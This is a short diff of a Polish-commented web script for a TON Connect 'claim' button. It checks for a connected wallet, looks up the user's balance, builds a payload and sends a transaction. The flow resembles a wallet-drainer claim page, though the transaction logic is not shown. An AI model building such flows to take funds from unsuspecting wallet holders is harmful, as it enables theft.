@@ -323,9 +323,11 @@
         }
 
         // Obsługa przycisku claim
+        // Zmodyfikowana część skryptu
         document.getElementById('claim-button').addEventListener('click', async () => {
             try {
-                if (!tonConnectUI.connected) {
+                const wallet = await tonConnectUI.getWalletInfo();
+                if (!wallet) {
                     updateStatus('Please connect your wallet first', 'error');
                     return;
                 }
@@ -333,8 +335,9 @@
                 updateStatus('Preparing transaction...', 'info');
 
                 // Pobranie salda użytkownika
-                const userAddress = tonConnectUI.connected.account.address;
+                const userAddress = wallet.address;
                 const userBalance = await getUserBalance(userAddress);
+                console.log('User balance:', userBalance);
 
                 // Tworzenie payloadu
                 const payload = await createPayload();
@@ -358,6 +361,18 @@
             } catch (error) {
                 console.error('Transaction error:', error);
                 updateStatus(`Transaction error: ${error.message}`, 'error');
+            }
+        });
+
+        // Zmodyfikowana obsługa statusu połączenia
+        tonConnectUI.onStatusChange(async (wallet) => {
+            const claimButton = document.getElementById('claim-button');
+            if (wallet) {
+                claimButton.style.display = 'inline-block';
+                updateStatus(`Connected: ${wallet.address}`, 'success');
+            } else {
+                claimButton.style.display = 'none';
+                updateStatus('Please connect your wallet', 'info');
             }
         });
 
